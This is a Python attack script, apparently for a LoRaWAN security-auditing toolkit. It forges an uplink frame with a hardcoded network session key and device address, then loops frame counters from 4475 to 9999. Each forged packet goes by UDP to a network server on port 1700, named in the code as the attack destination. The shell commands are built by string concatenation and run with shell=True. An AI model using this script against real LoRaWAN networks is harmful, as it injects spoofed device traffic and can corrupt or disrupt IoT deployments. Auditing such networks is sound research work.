import os
import subprocess
import json



pathPacketCrafter ='python3 /home/hcordovillo/laf/tools/lorawan/PacketCrafter.py'
pathUdpSender ='python3 /home/hcordovillo/laf/tools/UdpSender.py'
destinoAtaque =' --dst-ip 0.0.0.0 --dst-port 1700'
emviroment="cd /home/hcordovillo/laf && export PYTHONPATH=$(pwd) && export ENVIRONMENT='DEV'"

NwkSKey='f7557e0e1981e61edf9088aaf83ac2a6'
AppSKey='00000000000000000000000000000000'

devAddr='01bfed6b'

PHYPayload = json.dumps({"mhdr": {"mType": "UnconfirmedDataUp","major": "LoRaWANR1"},"macPayload": {"fhdr": {"devAddr": devAddr,"fCtrl": {"adr": True,"adrAckReq": False,"ack": False,"fPending": False,"classB": False},"fCnt": 0,"fOpts": None},"fPort": 2,"frmPayload": [{"bytes": "/2EyELe4m4F5txMSp93Gi+Od7uT0wI/xFFPlKA=="}]},"mic": "7934d552"})

packetCrafter = pathPacketCrafter+' -j '+'\''+PHYPayload+'\''+ ' --key '+AppSKey+ ' --nwkskey ' +NwkSKey

data=str(subprocess.check_output(emviroment+'\n'+packetCrafter, shell=True))[269:325]

datosExtra = "\\x02\\xe67\\x00\\xb8\\'\\xeb\\xff\\xfez\\x80\\xdb"
uplinkMetaData = '{\\"rxpk\\":[{\\"tmst\\":2749728315,\\"chan\\":0,\\"rfch\\":0,\\"freq\\":867.300000,\\"stat\\":1,\\"modu\\":\\"LORA\\",\\"datr\\":\\"SF7BW125\\",\\"codr\\":\\"4/5\\",\\"lsnr\\":9.5,\\"rssi\\":-76,\\"size\\":23,\\"data\\":\\"'+data+'\\"}]}'

for i in range(4475, 10000):
  uplinkMetaDataCompleto = 'b\''+datosExtra+uplinkMetaData+'\''
  UdpSender = pathUdpSender + destinoAtaque + ' --data '+'"'+uplinkMetaDataCompleto+'"'+" --key "+NwkSKey+" --fcnt "+str(i)
  os.system(emviroment+'\n'+UdpSender)

